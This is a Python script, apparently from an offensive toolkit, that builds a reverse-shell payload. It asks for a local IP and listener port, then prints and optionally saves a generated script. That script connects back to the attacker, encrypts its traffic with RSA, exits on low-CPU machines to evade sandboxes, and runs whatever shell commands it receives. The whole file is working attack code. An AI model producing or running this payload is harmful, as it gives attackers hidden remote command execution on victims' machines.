import netifaces
import os

def generate():
    def get_local_ip():   
        interfaces = netifaces.interfaces()
        print('Available network interfaces:')
        options = []
        for i, interface in enumerate(interfaces):
            addresses = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addresses:
                ip_address = addresses[netifaces.AF_INET][0]['addr']
                print(f'{i+1}: {interface} ({ip_address})')
                options.append(ip_address)
    
        if not options:
            print('No IP addresses found for available network interfaces.')
            return None
        
        print('')
        print('---------------------------------------------------------------------------')
        print('')
    
        choice = input('Select an IP address (1-' + str(len(options)) + '): ')
        print('')
        print('---------------------------------------------------------------------------')
        print('')
    
        try:
            choice_num = int(choice)
            if choice_num < 1 or choice_num > len(options):
                raise ValueError
            else:
                ip_address = options[choice_num-1]
                print(f'Using IP address {ip_address} from {interfaces[choice_num-1]}')
                print('')
                print('---------------------------------------------------------------------------')
                print('')
        except ValueError:
            print('Invalid choice.')
            return None
    
        return ip_address
    lhost = get_local_ip()
    lport = int(input('Listener Port: '))
    print('')

    def generate_python(lhost, lport):
        python_script = f'''
import os, socket, subprocess, rsa, time;

public_key, private_key = rsa.newkeys(2048)
public_partner = None

if os.cpu_count() <= 2:
    quit()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))

public_partner = rsa.PublicKey.load_pkcs1(s.recv(2048))
s.send(public_key.save_pkcs1("PEM"))

while True:
    try:
        data = rsa.decrypt(s.recv(1024), private_key).decode("UTF-8")
        data = data.strip('\\n')
        if data == "quit":
            break
        if data[:2] == "cd":
            os.chdir(data[3:])
            s.send(rsa.encrypt(str.encode("\\n"), public_partner))
        elif data.startswith("dir"):
            directory = os.listdir(os.getcwd())
            dirbuf = "\\n" + "\\n".join(directory) + "\\n\\n"
            s.send(rsa.encrypt(dirbuf.encode(), public_partner))
        elif len(data) > 0:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read() + proc.stderr.read()
            output_str = str(stdout_value, "UTF-8")
            s.send(rsa.encrypt(str.encode("\\n" + output_str + "\\n"), public_partner))
    except Exception as e:
        time.sleep(1)
        continue

s.close()'''

        print('---------------------------------------------------------------------------')
        print('')
        print(python_script)
        print('')
        print('')
        print('---------------------------------------------------------------------------')
        print('')
        while True:
            choice = input("Do you want to save the script as a .py file? (Y/N): ").lower()
            if choice == 'y':
                filename = input("Enter the filename (without .py extension): ")
                with open(f'output/{filename}.py', 'w') as f:
                    f.write(python_script)
                print('')
                print(f"The Python script has been saved as {filename}.py in the output folder")
                break
            elif choice == 'n':
                break
            else:
                print('Invalid input. Please enter Y or N.')
    generate_python(lhost, lport)
